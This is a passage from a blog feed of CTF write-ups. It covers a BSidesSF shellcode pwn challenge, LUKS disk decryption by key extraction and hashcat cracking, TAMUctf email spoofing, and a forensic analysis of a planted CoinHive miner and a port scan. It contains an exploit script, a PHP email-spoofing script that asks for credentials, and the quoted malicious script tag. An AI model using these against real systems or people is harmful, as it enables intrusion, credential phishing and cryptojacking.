*0x8048680</span></span><br><span class="line"><span class="comment">#    c</span></span><br><span class="line"><span class="comment">#    ''')</span></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(SHELLCODE)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Now running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python runitplusplus.py </span><br><span class="line">[+] Opening connection to runitplusplus-a36bf652.challenges.bsidessf.net on port 5353: Done</span><br><span class="line">Send me stuff!!</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ cat home/ctf/flag.txt</span><br><span class="line">&#123;ti_nar_uoy&#125;FTC</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to runitplusplus-a36bf652.challenges.bsidessf.net port 5353</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><p>The flag was <strong>{ti_nar_uoy}FTC</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;runitplusplus 52&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;This is the same as runit, except requir
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x86" scheme="https://teamrocketist.github.io/categories/Pwn/x86/"/>
    
    
      <category term="bsidesSF" scheme="https://teamrocketist.github.io/tags/bsidesSF/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] BsidesSF 2019 - goodluks3</title>
    <link href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks3/"/>
    <id>https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks3/</id>
    <published>2019-03-05T22:57:04.000Z</published>
    <updated>2019-03-05T23:16:27.394Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>goodluks3</p></blockquote><blockquote><p><strong>Description:</strong><br>Our third suspect was caught with a running machine with the encrypted disk mounted.<br>We captured the whole hard drive and system memory for you. Can you help us?<br>(Please note, this is a rather large file!)<br>   <a href="https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks3.7z" target="_blank" rel="noopener">https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks3.7z</a><br>Solved   </p></blockquote><p>After extracting this 7z file we get an image (<strong>goodluks3.img</strong>) and a memory dump (<strong>goodluks3.mem</strong>), eventually I tried to use <strong>volatility</strong> to analyse the memory but It was way too slow and I still needed to find a profile for this specific linux machine which is always a mess. </p><p>Normally when you have a luks encryption disk and a memory dump in this kind of ctf challenges the objective is normally to find the master key within the dump. So I tried to use <strong>aesfindkey</strong> on the memory dump but It didn’t find anything, after this I started to look for a different tool and I found this <a href="https://sourceforge.net/projects/findaes/" target="_blank" rel="noopener">one</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./findaes ../goodluks3.mem</span><br><span class="line">Searching ../goodluks3.mem</span><br><span class="line">Found AES-256 key schedule at offset 0x895dd88: </span><br><span class="line">b0 7a 29 f5 44 15 47 76 57 04 6e ec d3 03 f5 bd af a4 e6 df b2 71 01 ab af 7e 22 e1 23 94 15 f5 </span><br><span class="line">Found AES-256 key schedule at offset 0x895df78: </span><br><span class="line">8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a</span><br></pre></td></tr></table></figure><p>It found two AES-256 keys, It is time to set up our loop device from the luks image, so lets look at the partitions on <strong>parted</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ sudo parted goodluks3.img</span><br><span class="line">GNU Parted 3.2</span><br><span class="line">Using ~/ctf/bctf/forensics/goodluks3/goodluks3.img</span><br><span class="line">Welcome to GNU Parted! Type <span class="string">'help'</span> to view a list of commands.</span><br><span class="line">(parted) U                                                                </span><br><span class="line">Unit?  [compact]? B                                                       </span><br><span class="line">(parted) <span class="built_in">print</span>                                                            </span><br><span class="line">Model:  (file)</span><br><span class="line">Disk ~/ctf/bctf/forensics/goodluks3/goodluks3.img: 4294967296B</span><br><span class="line">Sector size (logical/physical): 512B/512B</span><br><span class="line">Partition Table: msdos</span><br><span class="line">Disk Flags: </span><br><span class="line"></span><br><span class="line">Number  Start        End          Size         Type     File system     Flags</span><br><span class="line"> 1      1048576B     2999975935B  2998927360B  primary  ext4            boot</span><br><span class="line"> 2      2999975936B  4000317439B  1000341504B  primary</span><br><span class="line"> 3      4000317440B  4293918719B  293601280B   primary  linux-swap(v1)</span><br><span class="line"></span><br><span class="line">(parted)</span><br></pre></td></tr></table></figure><p>We want to set a loop device on number <strong>2</strong> which its <strong>offset</strong> starts at <strong>2999975936B</strong> so lets use <strong>losetup</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo losetup --offset 2999975936 /dev/loop0 goodluks3.img</span><br></pre></td></tr></table></figure><p>And now lets convert one of the dumped keys into a file and decode them into ASCII:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo &apos;8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a&apos; | tr -d &apos; &apos; | xxd -r -p &gt; key0</span><br></pre></td></tr></table></figure><p>Lets try to decrypt now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cryptsetup luksOpen --master-key-file key0 /dev/loop14 decrypted</span><br><span class="line">Cannot <span class="built_in">read</span> 64 bytes from keyfile key0.</span><br></pre></td></tr></table></figure><p>And we got an error ? They expected a 64 byte key which means  the encryption used was <strong>AES-512</strong> and not <strong>AES-256</strong>, after this I remembered that we got two <strong>AES-256</strong> from <strong>findaes</strong>, what if the full keys is the two keys joined? so lets try that:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">'8e 8c 3a 67 eb 11 54 6c b1 cc 7d 0f cc 85 e8 43 30 7c 16 d4 7f 86 08 a1 0f 59 3d 4c 31 0f c8 6a b0 7a 29 f5 44 15 47 76 57 04 6e ec d3 03 f5 bd af a4 e6 df b2 71 01 ab af 7e 22 e1 23 94 15 f5'</span> | tr -d <span class="string">' '</span> | xxd -r -p &gt; key0</span><br><span class="line">$ sudo cryptsetup luksOpen --master-key-file key0 /dev/loop0 decrypted</span><br></pre></td></tr></table></figure><p>And it worked! the command didn’t spit any kind of errors so lets mount it and get the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mount /dev/mapper/decrypted /mnt/</span><br><span class="line">$ ls /mnt/</span><br><span class="line">collected-wallpapers-master/  ctfscoreboard-master/  flag.txt  lost+found/</span><br><span class="line">$ cat /mnt/flag.txt </span><br><span class="line">CTF&#123;lucky_U_k33p_secrets!&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>CTF{lucky_U_k33p_secrets!}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;goodluks3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;br&gt;Our third suspect was caught with a running mac
      
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="bsidesSF" scheme="https://teamrocketist.github.io/tags/bsidesSF/"/>
    
      <category term="luks" scheme="https://teamrocketist.github.io/tags/luks/"/>
    
      <category term="masterkey" scheme="https://teamrocketist.github.io/tags/masterkey/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] BsidesSF 2019 - goodluks2</title>
    <link href="https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks2/"/>
    <id>https://teamrocketist.github.io/2019/03/05/Forensics-BsidesSF-2019-goodluks2/</id>
    <published>2019-03-05T02:18:25.000Z</published>
    <updated>2019-03-05T02:24:59.325Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>goodluks2</strong><br><em>100</em></p></blockquote><blockquote><p><strong>Description:</strong><br>Our first insider threat has lead to a second insider. We haven’t found any clues to the passphrase here, but given the<br>vocabulary of the suspect, I don’t think you’ll have a hard time.  </p><p>   <a href="https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks2.7z" target="_blank" rel="noopener">https://storage.googleapis.com/bsides-sf-ctf-2019-large-artifacts/goodluks2.7z</a></p></blockquote><p>We have disk image and by the name of the challenge and the description we can already guess that it’s encrypted with luks</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file goodluks2.img </span><br><span class="line">goodluks2.img: DOS/MBR boot sector; partition 1 : ID=0x83, start-CHS (0x0,32,33), end-CHS (0x51,85,4), startsector 2048, 67106816 sectors, extended partition table (last)</span><br></pre></td></tr></table></figure><p>We don’t any more files so we need to actually brute force the passphrase, so let’s try using hashcat for this. But First of all we need to set up a loop device of our image, we need to check the partitions with parted and look at the offset:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sudo parted goodluks2.img </span><br><span class="line">GNU Parted 3.2</span><br><span class="line">(parted) U                                                                </span><br><span class="line">Unit?  [compact]? B                                                       </span><br><span class="line">(parted) <span class="built_in">print</span>                                                            </span><br><span class="line">Model:  (file)</span><br><span class="line">Disk ~/ctf/bsidectf/forensics/goodluks2/goodluks2.img: 34359738368B</span><br><span class="line">Sector size (logical/physical): 512B/512B</span><br><span class="line">Partition Table: msdos</span><br><span class="line">Disk Flags: </span><br><span class="line"></span><br><span class="line">Number  Start     End           Size          Type     File system  Flags</span><br><span class="line"> 1      1048576B  34359738367B  34358689792B  primary</span><br></pre></td></tr></table></figure><p>We want to loop the primary partition so we want to use <strong>losetup</strong> at <strong>1048576</strong> offset:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ls /dev/loop*</span><br><span class="line">/dev/loop0  /dev/loop1 /dev/loop2  /dev/loop3  /dev/loop4  /dev/loop5  /dev/loop6  /dev/loop7  /dev/loop-control</span><br><span class="line">$ sudo losetup --offset 1048576 /dev/loop8 goodluks2.img</span><br><span class="line">$ ls /dev/loop*</span><br><span class="line">/dev/loop0  /dev/loop1 /dev/loop2  /dev/loop3  /dev/loop4  /dev/loop5  /dev/loop6  /dev/loop7 /dev/loop8  /dev/loop-control</span><br></pre></td></tr></table></figure><p>Now that we have to extract the <strong>luks header</strong> which will contain the <strong>hash</strong> for us to crack, we can use <strong>dd</strong> but first we need to locate the offset to the header, we can do this with <strong>cryptsetup luksDump</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sudo cryptsetup luksDump /dev/loop8 </span><br><span class="line">LUKS header information <span class="keyword">for</span> /dev/loop8</span><br><span class="line"></span><br><span class="line">Version:       1</span><br><span class="line">Cipher name:   aes</span><br><span class="line">Cipher mode:   cbc-essiv:sha256</span><br><span class="line">Hash spec:     sha1</span><br><span class="line">Payload offset:4096</span><br><span class="line">MK bits:       256</span><br><span class="line">MK digest:     f9 88 ef ee 9e 28 aa 8c 5a 9e ca 1b fa 50 f6 1b be b7 db 85 </span><br><span class="line">MK salt:       5b b3 77 d8 e9 dd 1f ea 61 b1 21 20 53 54 e1 e1 </span><br><span class="line">               b4 fd 11 21 bf 41 67 6f 9d 80 62 f3 b1 2f 6c dd </span><br><span class="line">MK iterations: 132387</span><br><span class="line">UUID:          4e42c516-dc27-402d-872b-a086739d7e2f</span><br><span class="line"></span><br><span class="line">Key Slot 0: ENABLED</span><br><span class="line">Iterations:         10260</span><br><span class="line">Salt:               73 2d 5e e0 7e 99 40 8c ff ca de 32 c4 2d e0 <span class="built_in">cd</span> </span><br><span class="line">                      1b 6d ad b9 39 08 b5 c5 09 04 af 64 28 d5 bd a9 </span><br><span class="line">Key material offset:8</span><br><span class="line">AF stripes:            4000</span><br><span class="line">Key Slot 1: DISABLED</span><br><span class="line">Key Slot 2: DISABLED</span><br><span class="line">Key Slot 3: DISABLED</span><br><span class="line">Key Slot 4: DISABLED</span><br><span class="line">Key Slot 5: DISABLED</span><br><span class="line">Key Slot 6: DISABLED</span><br><span class="line">Key Slot 7: DISABLED</span><br></pre></td></tr></table></figure><p>The payload <strong>offset</strong> is <strong>4096</strong>, now finally we can extract the hash with <strong>dd</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo dd <span class="keyword">if</span>=/dev/loop8 of=LUKS_Header.dd bs=521 count=4096</span><br></pre></td></tr></table></figure><p>Now we just need to crack with <strong>hashcat</strong>, I used the password list named <strong>rockyou.txt</strong> you can find it easily on the internet it took approximately 14 minutes with both <strong>CPU</strong> and <strong>GPU</strong> running:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/IdOFaCM.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IdOFaCM.png" alt><br></a></p><p><a data-fancybox="gallery" href="https://i.imgur.com/29cFRe8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/29cFRe8.png" alt><br></a></p><p>After cracking it (<strong>gaffer3</strong>) we just need decrypt and mount the disk to get the flag!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo cryptsetup luksOpen /dev/loop11 bkup</span><br><span class="line">Enter passphrase <span class="keyword">for</span> ~/ctf/bsidectf/forensics/goodluks2/goodluks2.img: gaffer3</span><br><span class="line">$ sudo mount /dev/mapper/bkup /mnt/</span><br><span class="line">$ ls /mnt/</span><br><span class="line">flag.txt  JohnTheRipper.7z  lost+foundrockyou.7z</span><br><span class="line">$ cat /mnt/flag.txt </span><br><span class="line">CTF&#123;lame_users_keys_suck&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>CTF{lame_users_keys_suck}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;goodluks2&lt;/strong&gt;&lt;br&gt;&lt;em&gt;100&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;br&gt;Our first insi
      
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="bsidesSF" scheme="https://teamrocketist.github.io/tags/bsidesSF/"/>
    
      <category term="luks" scheme="https://teamrocketist.github.io/tags/luks/"/>
    
      <category term="hashcat" scheme="https://teamrocketist.github.io/tags/hashcat/"/>
    
      <category term="dictionaryAttack" scheme="https://teamrocketist.github.io/tags/dictionaryAttack/"/>
    
  </entry>
  
  <entry>
    <title>[MISC] TAMUctf - Onboarding Checklist</title>
    <link href="https://teamrocketist.github.io/2019/03/04/MISC-TAMUctf-Onboarding-Checklist/"/>
    <id>https://teamrocketist.github.io/2019/03/04/MISC-TAMUctf-Onboarding-Checklist/</id>
    <published>2019-03-04T11:16:45.000Z</published>
    <updated>2019-03-04T11:26:38.922Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Onboarding Checklist</strong><br><em>465</em></p></blockquote><blockquote><p><strong>Description:</strong><br>From: <a href="mailto:importantperson@somebigcorp.com" target="_blank" rel="noopener">importantperson@somebigcorp.com</a><br>Date: Feb 22, 2019 9:00 AM<br>To: <a href="mailto:someguy@somebigcorp.com" target="_blank" rel="noopener">someguy@somebigcorp.com</a><br>Subject: New Employee Access</p><p>Hello Some Guy,<br>We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee’s email address to <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a> so they can process the account request?<br>Thank you,<br>Important Person</p><p>The new employee can be a little slow to respond.</p><p>Difficulty: easy</p><p>2/26 8:42 am CST: Visting  <code>somebigcorp.com</code>  is not part of the challenge</p></blockquote><p>The goal of this challenge is clear. Send an email to <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a> requesting the credentials for the new employee. Although … we need to be disguised as <a href="mailto:someguy@somebigcorp.com" target="_blank" rel="noopener">someguy@somebigcorp.com</a> in order to request the credentials. How?</p><p><strong>*Email spoofing</strong> is the forgery of an email header so that the message appears to have originated from someone or somewhere other than the actual source.*</p><p>To use this technique there is a perfect PHP function called mail(). All we need is a PHP server and an email server (check it up how to setup one on google if you don’t know how to do it)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mail ( string  $to , string  $subject , string  $message [, [mixed] $additional_headers [, string  $</span><br><span class="line">    additional_parameters ]] ) : bool</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The most important parameters in this case are: <em>From</em> and <em>Reply-To</em> in the additional headers section.  In the <em>From</em> argument we put the email we want to spoof and in the <em>Reply-To</em> we chose the email where we want the people that we fooled to send the replies, in this case we want to fool <a href="mailto:tamuctf@gmail.com" target="_blank" rel="noopener">tamuctf@gmail.com</a>. </p><p>So to retrieve the flag all we need is:</p><ul><li>PHP Server</li><li>Email Server</li><li>An email where we can receive the credentials (let’s call it <a href="mailto:examplemail@10minutemail.com" target="_blank" rel="noopener">examplemail@10minutemail.com</a>)</li><li>Call the PHP mail() function from the server.</li><li>Put the email where we want to receive the info into the body of the mail()’s message</li></ul><p>Let’s create the file <em>imnotspoofing.php</em> with the following content<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$to= <span class="string">'tamuctf@gmail.com'</span>;</span><br><span class="line">$subject = <span class="string">'Requesting new employee credentials'</span>;</span><br><span class="line">$message= <span class="string">'Hello. I am request the new employee credentials. Can you send them to my email examplemail@10minutemail.com. Thanks'</span></span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'From: someguy@somebigcorp.com'</span>,</span><br><span class="line">            <span class="string">'Reply-To:  examplemail@10minutemail.com'</span>,</span><br><span class="line">            <span class="string">'X_Mailer: PHP/'</span> . phpversion()</span><br><span class="line">            );</span><br><span class="line">mail($to, $subject, $message, implode(<span class="string">"\n"</span>, $headers));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>Shortly after we running this PHP snippet from our server, we’ll receive an email in our <a href="mailto:examplemail@10minutemail.com" target="_blank" rel="noopener">examplemail@10minutemail.com</a> with the flag:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/TDBkzNW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/TDBkzNW.png] &quot;flag&quot; =720x" alt="alt text"><br></a><br> <strong>FLAG:</strong> gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Onboarding Checklist&lt;/strong&gt;&lt;br&gt;&lt;em&gt;465&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;br&gt;Fro
      
    
    </summary>
    
      <category term="Misc" scheme="https://teamrocketist.github.io/categories/Misc/"/>
    
    
      <category term="mailSpoofing" scheme="https://teamrocketist.github.io/tags/mailSpoofing/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] TAMUctf - DriveByInc</title>
    <link href="https://teamrocketist.github.io/2019/03/03/Forensics-TAMUctf-DriveByInc/"/>
    <id>https://teamrocketist.github.io/2019/03/03/Forensics-TAMUctf-DriveByInc/</id>
    <published>2019-03-03T22:04:16.000Z</published>
    <updated>2019-03-04T02:35:18.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0-intrusion"><a href="#0-intrusion" class="headerlink" title="0_intrusion"></a>0_intrusion</h1><blockquote><br>0_intrusion<br>100<br><br>Welcome to Drive By Inc. We provide all sorts of logistical solutions for our customers.<br>Over the past few years we moved to hosting a large portion of our business on a nice looking website.<br>Recently our customers are complaining that the front page of our website is causing their computers to run extremely slowly.<br>We hope that it is just because we added too much javascript but can you take a look for us just to make sure?<br><br>1.    What is the full malicious line? (Including any HTML tags)<br><br><br></blockquote><p>For the first part we needed to find the malicious line on this html file, after analysing it we found a malicious line using a known javascript miner api we could also note that the API was being loaded from an external server which the ip is 10.187.195.95.</p><p>The answer was:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span> = <span class="string">http://10.187.195.95/js/colorbox.min.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">var</span> color = <span class="keyword">new</span> CoinHive.Anonymous(<span class="string">"123456-asdfgh"</span>);color.start()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="1-logs"><a href="#1-logs" class="headerlink" title="1_logs"></a>1_logs</h1><blockquote><br>1_logs<br>100<br><br>Strange.<br>We don’t know how that got there.<br>We have since gone and removed the offending lines.<br>Maybe one of our developers wanted to make some money on the side.<br>Here is a pcap and some web server logs from the day that users started complaining.<br>Can you figure out if something nefarious happened while we go talk to the devs?<br><br>Link to pcap<br><br>What is the ip of the attacker?<br>What ports did they find open? (List low to high ex: 1,2,3)<br>What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)<br><br>2/23 1:08 am CST add forgotten log files 2/23 8:29 am CST add slight clarification to 2<br><br></blockquote><h3 id="What-is-the-ip-of-the-attacker"><a href="#What-is-the-ip-of-the-attacker" class="headerlink" title="What is the ip of the attacker?"></a>What is the ip of the attacker?</h3><p>Now that we have a network capture we can start analysing the network, so for the first question we remembered that there was a JavaScript file being loaded from an ip <strong>10.187.195.95</strong> from the previous part, so we tried to answer that and we got the 1st question, that was indeed the ip from the attacker. </p><h3 id="What-ports-did-they-find-open-List-low-to-high-ex-1-2-3"><a href="#What-ports-did-they-find-open-List-low-to-high-ex-1-2-3" class="headerlink" title="What ports did they find open? (List low to high ex: 1,2,3)"></a>What ports did they find open? (List low to high ex: 1,2,3)</h3><p>After this we started to analyse the pcap with this filter <strong>ip.src == 10.187.195.95 || ip.dst == 10.187.195.95</strong> with this we removed all the irrelevant packets for the problem. By reading the question we can already know the attacker did a port scan on the server probably used <strong>nmap</strong> or something so to apply the right filters on tshark and extract <strong>the ports</strong> we need to know how a port scan works in practice.</p><p>By just looking at Wireshark in the beginning  we can see the attacker used a tcp syn scan:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/KKCjPol.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KKCjPol.png" alt><br></a><br>As you can see the attacker issues a lot of <strong>syns</strong> and receives from the server lot of answers from the server as <strong>RST,ACK</strong> (wireshark changes the color of this packets to red), <strong>RST,ACK</strong> means the port is closed…</p><p>Resuming how a SYN scan works:</p><ul><li>An attacker issues a SYN, if the server replies <strong>SYN,ACK</strong> : It means the port is open!</li><li>An attacker issues a SYN, if the server replies <strong>RST,ACK</strong> : It means the port is closed!</li><li>An attacker issues a SYN, if the server does not reply, or replies with <strong>ICMP</strong> error : it means that port is <strong>filtered</strong>. Likely an IDS / stateful firewall block your request.</li></ul><p>So now we need to start working on our tshark command, we need to check which tcp.flags replies with <strong>SYN,ACK</strong> it needs to come from the server with destination to the attacker IP, the field on wireshark to filter the protocol is <strong>ip.proto</strong> and the number for TCP protocol is 6, the way I do to find out the name of the fields on wireshark is by doing this:</p><p>First you choose the field you want to filter:<br><a data-fancybox="gallery" href="https://i.imgur.com/ylBSEGR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ylBSEGR.png" alt><br></a><br>Then a website will open and search for the field you want to filter in this case is “Protocol”:<br><a data-fancybox="gallery" href="https://i.imgur.com/RpINGT9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/RpINGT9.png" alt><br></a><br>Now you do the same for the tcp flags, to know the number when a SYN,ACK occurs we need to find a successful response to know the number and after we find it we know we need to use <strong>tcp.flags == 0x12</strong> filter:<br><a data-fancybox="gallery" href="https://i.imgur.com/MsfEaET.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/MsfEaET.png" alt><br></a><br>The final script is:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tshark -r capture.pcap -Y <span class="string">"ip.dst == 10.187.195.95 &amp;&amp; ip.proto == 6 &amp;&amp; tcp.flags == 0x00000012"</span> -Tfields -e tcp.srcport | sort -u</span><br><span class="line">22</span><br><span class="line">80</span><br></pre></td></tr></table></figure></p><p>The answer to the 2nd question is 22,80.</p><h3 id="What-are-the-names-of-the-web-files-they-found-on-the-server-List-in-alphabetical-order-comma-separated-ex-a-html-a-php-b-html"><a href="#What-are-the-names-of-the-web-files-they-found-on-the-server-List-in-alphabetical-order-comma-separated-ex-a-html-a-php-b-html" class="headerlink" title="What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)"></a>What are the names of the web files they found on the server? (List in alphabetical order comma separated ex: a.html,a.php,b.html)</h3><p>So for this I used wireshark, I used the first filter <strong>ip.src == 10.187.195.95 || ip.dst == 10.187.195.95 &amp;&amp; http</strong> to filter only http packets and now we need to know the replies from the server the ones that answer with a 200 status code, we can see the attacker ran a script with a list of files, the server will reply 404 on files that 